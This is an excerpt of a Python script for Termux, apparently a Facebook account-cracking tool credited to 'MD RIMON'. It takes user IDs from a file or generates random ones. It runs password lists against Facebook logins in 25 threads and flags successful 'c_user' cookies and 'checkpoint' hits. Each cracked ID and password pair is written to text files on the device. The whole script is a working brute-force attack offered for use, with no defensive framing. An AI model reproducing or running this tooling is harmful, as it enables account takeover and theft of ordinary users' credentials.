...
â•”â•¦â•—â•”â•â•—â•¦â•â•—â•”â•¦â•—â•¦ â•¦â•â•— â•¦  â•”â•â•—â•”â•â•—â•¦ â•¦â•¦â•â•—â•”â•â•—â•”â•â•—
 ...
 â•© â•šâ•â•â•©â•šâ•â•© â•©â•šâ•â•â•© â•šâ•  â•šâ•â•â•šâ•â•â•šâ•â•â•©â•šâ•â•šâ•â•â•šâ•â•
\33[1;37m----------------------------------------------
\33[1;97m[\33[1;92m=\33[1;97m] \33[1;92mFACEBOOK  \x1b[1;97m : \33[1;92m MD RIMON            
\33[1;97m[\33[1;92m=\33[1;97m] \33[1;92mGITHUB    \x1b[1;97m : \33[1;92m RIMON-143      
\33[1;97m[\33[1;92m=\33[1;97m] \33[1;92mTOOLTYPE  \x1b[1;97m : \33[1;92m FILE \x1b[1;97mã€†\x1b[1;92m RANDOM 
\33[1;97m[\33[1;92m=\33[1;97m] \33[1;92mVERSION   \x1b[1;97m : \33[1;91m 2.0
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			print('[5] Join Telegram Channel')
			print('\x1b[1;91m[0] Exit main menu')
			linex()
			sexxx=input(' Choose an option: ')
			if sexxx in ['1','01']:
				os.system('clear')
				print(logo)
				print(' Example : /sdcard/R1M0N.txt')
				linex()
				...
				with tred(max_workers=25) as crack_submit:
					...
					for user in fo:
						...
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(_SEXX_1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(_SEXX_2,ids,names,passlist)
				print('\033[1;37m')
				linex()
				...
				os.system('xdg-open https://t.me/termux_course365');menu()
			elif sexxx in ['0','00']:
				exit('')
			else:
				exit(' Option not found in menu...')
		
def _SEXX_1(ids,names,passlist):
	global loop,oks,cps
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[R1M0N-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/R1M0N-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[R1M0N-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/R1M0N-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def _SEXX_2(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mR1M0N\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[R1M0N-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/R1M0N-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def fuckxx():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] Method Fire')
	print('\x1b[1;97m[0] Back')
	linex()
	opt = input('[âˆš] SELECT OPTION : \x1b[1;92m')
	if opt =='1':
		random_number3()    
	else:
...
#___________________BD1___________________#
def bd1():
	uid=[]
	os.system('clear')
	print(logo)
...
#___________________Choose___________________#
def chos():
    user=[]
    twf =[]
    os.getuid
...
#___________________RANDOM___________________#
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[R1M0N-OK] '+cid+' | '+ps+'\033[1;32m')
				open('R1M0N-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[R1M0N-CP] '+cid+' | '+ps+'\33[0;97m')
				open('R1M0N-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
